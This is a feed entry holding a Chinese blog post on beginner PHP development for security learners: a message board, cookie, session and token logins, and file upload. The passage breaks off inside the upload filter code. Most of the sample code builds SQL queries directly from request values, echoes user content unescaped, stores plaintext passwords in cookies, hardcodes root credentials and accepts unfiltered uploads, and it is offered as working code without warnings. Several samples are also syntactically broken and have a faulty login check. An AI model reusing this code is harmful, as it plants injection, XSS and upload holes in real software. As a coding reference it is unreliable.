    <link href="https://ink-scholar.github.io/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/"/>
    <id>https://ink-scholar.github.io/2024/01/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8A)/</id>
    <published>2024-01-22T13:55:33.707Z</published>
    <updated>2024-02-07T04:29:26.239Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一些开发方面的内容，毕竟不懂代码不会开发只能做一个脚本小子</strong></em></p><h1 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h1><h2 id="留言板-评论区"><a href="#留言板-评论区" class="headerlink" title="留言板&#x2F;评论区"></a>留言板&#x2F;评论区</h2><p>大体上分四步，浏览器输入昵称和内容提交、服务器接收数据写入数据库、数据库返回结果通知服务器、服务器将最终结果交给浏览器</p><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>PHP连接mysql，使用mysqli函数，常用：</p><p>mysqli_connect()   打开一个到Mysql的新的连接，mysqli_select_db()   更改连接的默认数据库，mysqli_query()   执行某个针对数据库的查询</p><p>mysqli_fetch_row()   从结果集中取得一行，并作为枚举数组返回，mysqli_close()   关闭先前打开的数据库连接</p><h3 id="Mysql增删改查"><a href="#Mysql增删改查" class="headerlink" title="Mysql增删改查"></a>Mysql增删改查</h3><p><strong>查</strong>：select * from 表名 where 列名&#x3D;’条件’;    <strong>增</strong>：insert into 表名(‘列名1’, ‘列名2’) value(‘列1值1’, ‘列2值2’);</p><p><strong>删</strong>：delete from 表名 where 列名 &#x3D; ‘条件’;    <strong>改</strong>：update 表名 set 列名 &#x3D; 数据 where 列名 &#x3D; ‘条件’;</p><h3 id="PHP全局变量"><a href="#PHP全局变量" class="headerlink" title="PHP全局变量"></a>PHP全局变量</h3><p>$GLOBALS：全局变量用于在PHP脚本中的任意位置访问全局变量，$_SERVER：超全局变量保存关于报头、路径和脚本位置的信息</p><p>$_POST：提交method为post的表单数据，$_REQUEST：用于收集表单数据，get和post都可</p><p>$_GET：收集URL中发送的数据，也用于收集method为get的表单数据</p><p>$_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容</p><p>$_ENV：是一个包含服务器端环境变量的数组，$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容</p><p>$_SESSION：是一个关联数组，包含当前脚本中所有session内容</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>php和html混合写</p><p>action为空，则表单提交给自己，以username来传递用户名，以content传递内容的值，写一个插入并显示留言的 <strong>addshow.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">      用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    内容： &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$dbip=&#x27;localhost&#x27;;</span><br><span class="line">$dbuser=&#x27;root&#x27;;</span><br><span class="line">$dbpass=&#x27;123456&#x27;;</span><br><span class="line">$dbname=&#x27;test&#x27;;</span><br><span class="line">$uername=@$_POST[&#x27;username&#x27;];</span><br><span class="line">$content=@$_POST[&#x27;content&#x27;];</span><br><span class="line">$ip=@$_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">$ua=@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$con=mysqli_connect($dbip,$dbuser,$dbpass,$dbname);</span><br><span class="line">if (!$con)</span><br><span class="line">&#123;</span><br><span class="line">  die(&quot;数据库连接错误&quot;.mysqli_connect_error());</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  $sql=&quot;insert into test_table(username,content,ipaddr,useragent) value(&#x27;$uername&#x27;,&#x27;$content&#x27;,&#x27;$ip&#x27;,&#x27;$ua&#x27;);&quot;;</span><br><span class="line">  if (mysqli_query($con,$sql))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    $sql_select=&quot;select * from test_table&quot;;</span><br><span class="line">    $data=mysqli_query($con,$sql_select);</span><br><span class="line">    while ($row=mysqli_fetch_row($data))</span><br><span class="line">    &#123;</span><br><span class="line">      echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">      echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">      echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">      echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">      echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码中，在连接数据库那一段，如果你每次操作数据库时，都有把ip，user什么的都写一遍，很麻烦，所以我们可以先写一个数据库连接的文件，专门存放这类代码，如果要使用时，只需在别的文件中包含即可，比如我们定义一个 <strong>data_connect.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>&gt;</span><br><span class="line"><span class="variable">$dbip</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbip</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们在<strong>当前目录</strong>写一个删除的PHP文件，就叫<strong>delete.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;data_connect.php&#x27;;</span><br><span class="line">$sql_select=&quot;select * from test_table&quot;;</span><br><span class="line">$data=mysqli_query($con,$sql_select);</span><br><span class="line">while ($row=mysqli_fetch_row($data))</span><br><span class="line">&#123;</span><br><span class="line">   echo &#x27;&lt;hr&gt;&#x27;</span><br><span class="line">   echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">   echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">   echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">   echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">   echo &quot;&lt;a href=&#x27;delete.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$del=@$_GET[&#x27;del&#x27;];</span><br><span class="line">if(isset($del))&#123;</span><br><span class="line">  $sql_delete=&quot;delete from test_table where username = &#x27;$del&#x27;;&quot;;</span><br><span class="line">  if(mysqli_query($con,$sql_delete))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>不过这样写有些小bug，就是当用户名一致的时候，数据库里的数据都删除了，但是页面上的还在，所以，我们最好将功能分装成函数形式</p><p>所以我们的 <strong>addshow.php</strong> 最好这么写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;data_connect.php&#x27;;</span><br><span class="line">function add_test($con)&#123;</span><br><span class="line">  $uername=@$_POST[&#x27;username&#x27;];</span><br><span class="line">  $content=@$_POST[&#x27;content&#x27;];</span><br><span class="line">$ip=@$_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">$ua=@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">  $sql=&quot;insert into test_table(username,content,ipaddr,useragent) value(&#x27;$uername&#x27;,&#x27;$content&#x27;,&#x27;$ip&#x27;,&#x27;$ua&#x27;);&quot;;</span><br><span class="line">  if (mysqli_query($con,$sql))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">function show_test($con)&#123;</span><br><span class="line">$sql_select=&quot;select * from test_table&quot;;</span><br><span class="line">$data=mysqli_query($con,$sql_select);</span><br><span class="line">while ($row=mysqli_fetch_row($data))&#123;</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line">show_test($con);</span><br><span class="line">add_test($con);</span><br></pre></td></tr></table></figure><h3 id="调用插件–ueditor"><a href="#调用插件–ueditor" class="headerlink" title="调用插件–ueditor"></a>调用插件–ueditor</h3><p>直接在我们的<strong>addshow.php</strong>中调用，将ueditor目录和addshow.php文件放在同一目录，引用即可，具体如何调用可以看相关教程，不多赘述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;/ueditor/ueditor.config.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/ueditor/ueditor.all.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">-------</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;UE.getEditor(&quot;content&quot;);&lt;/script&gt;</span><br><span class="line">-------</span><br></pre></td></tr></table></figure><h2 id="后台模块"><a href="#后台模块" class="headerlink" title="后台模块"></a>后台模块</h2><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>生成Cookie的流程：</p><p>1、客户端向服务器发送HTTP请求。<br>2、服务器检查请求头中是否包含cookie信息。<br>3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。<br>4、服务器在响应头中设置cookie信息并将其发送回客户端。<br>5、客户端接收响应并将cookie保存在本地。<br>6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。<br>7、服务器收到请求并检查cookie的有效性。<br>8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。</p><p>简单来说cookie是用户身份的凭证，存储在用户浏览器，存储容量有限，一般为4kb，可以设置过期时间</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>新建三个文件，login.php、index.php、logout.php</p><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;data_connect.php&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from admin where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$expire</span> = <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>;   <span class="comment">// 一天后过期</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$expire</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>, <span class="variable">$password</span>, <span class="variable">$expire</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&#x27;</span>登录失败！<span class="string">&#x27;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_COOKIE[&#x27;username&#x27;]!==&#x27;admin&#x27; and $_COOKIE[&#x27;password&#x27;]!==&#x27;123456&#x27;)&#123;</span><br><span class="line">  header(&#x27;Location: login.php&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;后台首页&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;欢迎你，&lt;?php echo $_COOKIE[&#x27;username&#x27;];?&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;logout.php&quot;&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><strong>logout.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">time</span>()-<span class="number">3600</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">time</span>()-<span class="number">3600</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>session是用户的会话凭证，存储在服务端，存储容量取决于服务器的硬件和配置，一般默认在浏览器关闭后或退出登录就会过期，session文件被删除</p><p>session_start(): 启动会话，用于开始或恢复一个已经存在的会话<br>$_SESSION: 用于存储和访问当前会话中的所有变量<br>session_destroy(): 销毁当前会话中的所有数据<br>session_unset(): 释放当前会话中的所有变量</p><p>在PHP.INI中session.save_path设置路径</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><p>同理，还是新建三个文件，login.php、index.php、logout.php</p><p><strong>login.php</strong></p><p>大体上和cookie那边的代码差不多，具体的函数不一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]=<span class="variable">$password</span>;</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// 把cookie函数换成session函数即可</span></span><br></pre></td></tr></table></figure><p><strong>logout.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br></pre></td></tr></table></figure><h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><p>1.身份验证：采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。<br>2、安全性：采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。<br>3、跨域访问：采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。<br>总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><p>写两个php文件，一个生成token为<strong>token.php</strong>，一个检查token为<strong>check_token.php</strong></p><p><strong>token.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$token = bin2hex(random_bytes(16));  //随机生成</span><br><span class="line">$_SESSION[&#x27;token&#x27;] = $token;  //将token保存到session中</span><br><span class="line">setcookie(&#x27;token&#x27;,$token,time()+3600,&#x27;/&#x27;);  //将token绑定到cookie中</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;login&quot;&gt;</span><br><span class="line">  &lt;h2&gt;后台登录&lt;/h2&gt;</span><br><span class="line">  &lt;form action=&quot;check_token.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $token; ?&gt;&quot;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><strong>check_token.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$token</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])&#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Accession denied&#x27;</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。<br>$_FILES[“表单值”][“name”]获取上传文件原始名称<br>$_FILES[“表单值”][“type”]获取上传文件MIME类型<br>$_FILES[“表单值”][“size”]获取上传文件字节单位大小<br>$_FILES[“表单值”][“tmp_name”]获取上传的临时副本文件名<br>$_FILES[“表单值”][“error”]获取上传时发生的错误代码<br>move_uploaded_file() 将上传的文件移动到指定位置的函数</p><h4 id="无过滤代码"><a href="#无过滤代码" class="headerlink" title="无过滤代码"></a>无过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$type</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$size</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmp_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$error</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$name</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="黑名单过滤代码"><a href="#黑名单过滤代码" class="headerlink" title="黑名单过滤代码"></a>黑名单过滤代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_ext</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>);  <span class="comment">//定义黑名单后缀</span></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>);    <span class="comment">//以点来拆分</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);     <span class="comment">//取后缀</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>,<span 